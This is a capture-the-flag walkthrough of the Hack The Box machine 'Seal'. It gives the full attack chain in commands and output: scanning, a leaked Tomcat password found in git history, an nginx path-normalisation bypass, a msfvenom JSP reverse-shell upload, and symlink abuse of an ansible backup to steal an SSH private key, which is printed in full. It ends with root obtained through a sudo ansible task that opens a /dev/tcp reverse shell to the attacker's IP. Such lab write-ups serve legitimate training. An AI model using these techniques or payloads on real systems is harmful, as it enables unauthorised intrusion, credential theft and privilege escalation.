# Scan

```bash
ghost@localhost [12:09:36] [~/Documents/hacking/tj-null-boxes/seal] [master *]
-> % nmap -sC -sV -oA nmap/seal $IP -v

Scanning 10.10.10.250 [1000 ports]
Discovered open port 22/tcp on 10.10.10.250
Discovered open port 443/tcp on 10.10.10.250
Discovered open port 8080/tcp on 10.10.10.250

PORT     STATE SERVICE    REASON  VERSION
8080/tcp open  http-proxy syn-ack
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 401 Unauthorized
|     Date: Mon, 24 Oct 2022 03:41:26 GMT
|     Set-Cookie: JSESSIONID=node0iz44kv3e69kj1kb1vfkddyyga3.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest:
|     HTTP/1.1 401 Unauthorized
|     Date: Mon, 24 Oct 2022 03:41:24 GMT
|     Set-Cookie: JSESSIONID=node0uxx1qeejxg1d16yezdxfdmgg61.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Mon, 24 Oct 2022 03:41:25 GMT
|     Set-Cookie: JSESSIONID=node086hxyl4anba4altmdyh59hvp2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck:
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest:
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4:
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5:
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=10/24%Time=63560963%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Mon,\x2024\x
SF:20Oct\x202022\x2003:41:24\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0uxx1
SF:qeejxg1d16yezdxfdmgg61\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Th
SF:u,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/htm
SF:l;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,107,"HT
SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2024\x20Oct\x202022\x2003:41:25\
SF:x20GMT\r\nSet-Cookie:\x20JSESSIONID=node086hxyl4anba4altmdyh59hvp2\.nod
SF:e0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x20
SF:00:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\x
SF:20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/ht
SF:ml;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close\
SF:r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Version
SF:</pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDa
SF:te:\x20Mon,\x2024\x20Oct\x202022\x2003:41:26\x20GMT\r\nSet-Cookie:\x20J
SF:SESSIONID=node0iz44kv3e69kj1kb1vfkddyyga3\.node0;\x20Path=/;\x20HttpOnl
SF:y\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nConten
SF:t-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(
SF:Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCont
SF:ent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nC
SF:onnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x
SF:20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x2040
SF:0\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;cha
SF:rset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\
SF:n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20
SF:CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20characte
SF:r\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCon
SF:tent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x2
SF:0400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
```


# 443 seal.htb

Running feroxbuster gives some links.

```bash
ghost@localhost [12:12:21] [~/Documents/hacking/tj-null-boxes/seal] [master *]
-> % feroxbuster -u https://$DOMAIN -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k

302      GET        0l        0w        0c https://seal.htb/images => http://seal.htb/images/
200      GET      518l     1140w    19737c https://seal.htb/
302      GET        0l        0w        0c https://seal.htb/admin => http://seal.htb/admin/
302      GET        0l        0w        0c https://seal.htb/icon => http://seal.htb/icon/
302      GET        0l        0w        0c https://seal.htb/css => http://seal.htb/css/
302      GET        0l        0w        0c https://seal.htb/js => http://seal.htb/js/
302      GET        0l        0w        0c https://seal.htb/manager => http://seal.htb/manager/
```


# 8080 GitBucket

Nothing come out of feroxbuster, but logging in to the service via creating account display some repositories.

2 users

1. alex@seal.htb
2. luis@seal.htb

Looking through `tomcat-users.xml` git commit history, I found `tomcat` with password `42MrHBf*z8{Z%`.

So from nginx config, I can see that it blocks `/manager/html` and `/admin/dashbaord`. So in order to bypass that we can do the attack explained in [Black Hat 2018](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf).

https://seal.htb/admin;name=orange/dashboard/
https://seal.htb/manager/404/..;/html/

# User

Using the tomcat server, you can upload shell and get back reverse shell.

```bash
ghost@localhost [13:03:07] [~/Documents/hacking/tj-null-boxes/seal] [master *]
-> % msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f war > shell.war


ghost@localhost [13:01:08] [~/Documents/hacking/tj-null-boxes/seal] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.250] 60586

id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)

which python

which python3
/usr/bin/python3

python3 -c 'import pty; pty.spawn("/usr/bin/bash")'
tomcat@seal:/home/luis$
```

Running `pspy` gives the following interesting process

```bash
...
2022/10/24 05:14:01 CMD: UID=0    PID=18539  | sleep 30
2022/10/24 05:14:31 CMD: UID=0    PID=18552  | sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
...
```

So I check the ansible runbook.

```bash
tomcat@seal:/var/lib/tomcat9$ cat /opt/backups/playbook/run.yml
cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/

tomcat@seal:/var/lib/tomcat9$ ls -la /opt/backups
total 16
drwxr-xr-x 4 luis luis 4096 Oct 24 05:19 .
drwxr-xr-x 3 root root 4096 May  7  2021 ..
drwxrwxr-x 2 luis luis 4096 Oct 24 05:20 archives
drwxrwxr-x 2 luis luis 4096 May  7  2021 playbook

tomcat@seal:/var/lib/tomcat9$ cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard
tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ find . -writable
find . -writable
./uploads

tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard$ cd ./uploads

tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ln -s /home/luis/.ssh/id_rsa luis.pem

tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ ls -l
ls -l
total 0
lrwxrwxrwx 1 tomcat tomcat 22 Oct 24 05:23 luis.pem -> /home/luis/.ssh/id_rsa

tomcat@seal:/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads$ cd /opt/backups

tomcat@seal:/opt/backups$ cd archives

tomcat@seal:/opt/backups/archives$ ls -la
ls -la
total 2380
drwxrwxr-x 2 luis luis   4096 Oct 24 05:23 .
drwxr-xr-x 4 luis luis   4096 Oct 24 05:23 ..
-rw-rw-r-- 1 luis luis 606047 Oct 24 05:20 backup-2022-10-24-05:20:32.gz
-rw-rw-r-- 1 luis luis 606047 Oct 24 05:21 backup-2022-10-24-05:21:32.gz
-rw-rw-r-- 1 luis luis 606047 Oct 24 05:22 backup-2022-10-24-05:22:32.gz
-rw-rw-r-- 1 luis luis 608923 Oct 24 05:23 backup-2022-10-24-05:23:32.gz

tomcat@seal:/opt/backups/archives$ cp "backup-2022-10-24-05:28:32.gz" /dev/shm

tomcat@seal:/opt/backups/archives$ cd /dev/shm

tomcat@seal:/dev/shm$ mv "backup-2022-10-24-05:28:32.gz" "backup.gz"
mv "backup-2022-10-24-05:28:32.gz" "backup.gz"

tomcat@seal:/dev/shm$ tar -xf backup.gz

tomcat@seal:/dev/shm$ ls
backup.gz  dashboard

tomcat@seal:/dev/shm/$ cd dashboard/uploads

tomcat@seal:/dev/shm/dashboard/uploads$ ls
luis.pem

tomcat@seal:/dev/shm/dashboard/uploads$ cat luis.pem
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsG
DkID79g/4XrnoKXm2ud0gmZxdVJUAQ33Kg3Nk6czDI0wevr/YfBpCkXm5rsnfo5zjEuVGo
MTJhNZ8iOu7sCDZZA6sX48OFtuF6zuUgFqzHrdHrR4+YFawgP8OgJ9NWkapmmtkkxcEbF4
n1+v/l+74kEmti7jTiTSQgPr/ToTdvQtw12+YafVtEkB/8ipEnAIoD/B6JOOd4pPTNgX8R
MPWH93mStrqblnMOWJto9YpLxhM43v9I6EUje8gp/EcSrvHDBezEEMzZS+IbcP+hnw5ela
duLmtdTSMPTCWkpI9hXHNU9njcD+TRR/A90VHqdqLlaJkgC9zpRXB2096DVxFYdOLcjgeN
3rcnCAEhQ75VsEHXE/NHgO8zjD2o3cnAOzsMyQrqNXtPa+qHjVDch/T1TjSlCWxAFHy/OI
PxBupE/kbEoy1+dJHuR+gEp6yMlfqFyEVhUbDqyhAAAFgOAxrtXgMa7VAAAAB3NzaC1yc2
EAAAGBALN5CEgnnXSmnAkIVXKU01XC8TPatokCs4vYbJ5RLdGe5HIWa0mbBg5CA+/YP+F6
56Cl5trndIJmcXVSVAEN9yoNzZOnMwyNMHr6/2HwaQpF5ua7J36Oc4xLlRqDEyYTWfIjru
7Ag2WQOrF+PDhbbhes7lIBasx63R60ePmBWsID/DoCfTVpGqZprZJMXBGxeJ9fr/5fu+JB
JrYu404k0kID6/06E3b0LcNdvmGn1bRJAf/IqRJwCKA/weiTjneKT0zYF/ETD1h/d5kra6
m5ZzDlibaPWKS8YTON7/SOhFI3vIKfxHEq7xwwXsxBDM2UviG3D/oZ8OXpWnbi5rXU0jD0
wlpKSPYVxzVPZ43A/k0UfwPdFR6nai5WiZIAvc6UVwdtPeg1cRWHTi3I4Hjd63JwgBIUO+
VbBB1xPzR4DvM4w9qN3JwDs7DMkK6jV7T2vqh41Q3If09U40pQlsQBR8vziD8QbqRP5GxK
MtfnSR7kfoBKesjJX6hchFYVGw6soQAAAAMBAAEAAAGAJuAsvxR1svL0EbDQcYVzUbxsaw
MRTxRauAwlWxXSivmUGnJowwTlhukd2TJKhBkPW2kUXI6OWkC+it9Oevv/cgiTY0xwbmOX
AMylzR06Y5NItOoNYAiTVux4W8nQuAqxDRZVqjnhPHrFe/UQLlT/v/khlnngHHLwutn06n
bupeAfHqGzZYJi13FEu8/2kY6TxlH/2WX7WMMsE4KMkjy/nrUixTNzS+0QjKUdvCGS1P6L
hFB+7xN9itjEtBBiZ9p5feXwBn6aqIgSFyQJlU4e2CUFUd5PrkiHLf8mXjJJGMHbHne2ru
p0OXVqjxAW3qifK3UEp0bCInJS7UJ7tR9VI52QzQ/RfGJ+CshtqBeEioaLfPi9CxZ6LN4S
1zriasJdAzB3Hbu4NVVOc/xkH9mTJQ3kf5RGScCYablLjUCOq05aPVqhaW6tyDaf8ob85q
/s+CYaOrbi1YhxhOM8o5MvNzsrS8eIk1hTOf0msKEJ5mWo+RfhhCj9FTFSqyK79hQBAAAA
wQCfhc5si+UU+SHfQBg9lm8d1YAfnXDP5X1wjz+GFw15lGbg1x4YBgIz0A8PijpXeVthz2
ib+73vdNZgUD9t2B0TiwogMs2UlxuTguWivb9JxAZdbzr8Ro1XBCU6wtzQb4e22licifaa
WS/o1mRHOOP90jfpPOby8WZnDuLm4+IBzvcHFQaO7LUG2oPEwTl0ii7SmaXdahdCfQwkN5
NkfLXfUqg41nDOfLyRCqNAXu+pEbp8UIUl2tptCJo/zDzVsI4AAADBAOUwZjaZm6w/EGP6
KX6w28Y/sa/0hPhLJvcuZbOrgMj+8FlSceVznA3gAuClJNNn0jPZ0RMWUB978eu4J3se5O
plVaLGrzT88K0nQbvM3KhcBjsOxCpuwxUlTrJi6+i9WyPENovEWU5c79WJsTKjIpMOmEbM
kCbtTRbHtuKwuSe8OWMTF2+Bmt0nMQc9IRD1II2TxNDLNGVqbq4fhBEW4co1X076CUGDnx
5K5HCjel95b+9H2ZXnW9LeLd8G7oFRUQAAAMEAyHfDZKku36IYmNeDEEcCUrO9Nl0Nle7b
Vd3EJug4Wsl/n1UqCCABQjhWpWA3oniOXwmbAsvFiox5EdBYzr6vsWmeleOQTRuJCbw6lc
YG6tmwVeTbhkycXMbEVeIsG0a42Yj1ywrq5GyXKYaFr3DnDITcqLbdxIIEdH1vrRjYynVM
ueX7aq9pIXhcGT6M9CGUJjyEkvOrx+HRD4TKu0lGcO3LVANGPqSfks4r5Ea4LiZ4Q4YnOJ
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----
```

Using the key, can ssh into the server as luis.

```bash
ghost@localhost [13:34:12] [~/Documents/hacking/tj-null-boxes/seal] [master *]
-> % ssh luis@10.10.10.250 -i luis.pem

Last login: Fri May  7 07:00:18 2021 from 10.10.14.2

luis@seal:~$ cat user.txt
d8bf9****
```

# Privilege escalation

When I did `sudo -l` it says that it can run any ansible playbooks as sudo.

```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *

luis@seal:~$ cp /opt/backups/playbook/run.yml .

luis@seal:~$
```

Run the following ansible script as sudo to get back root shell.

```bash
luis@seal:~$ cat run.yml
- hosts: localhost
  tasks:
          - name: Shell
            command: /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/4445 0>&1'

luis@seal:~$ sudo ansible-playbook run.yml
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] ********************************************

TASK [Gathering Facts] **************************************
ok: [localhost]

TASK [Shell] ************************************************
```

```bash
ghost@localhost [13:40:12] [~/Documents/hacking/tj-null-boxes/seal] [master *]
-> % nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.250] 44936

root@seal:/home/luis# cat /root/root.txt
4edae****
```
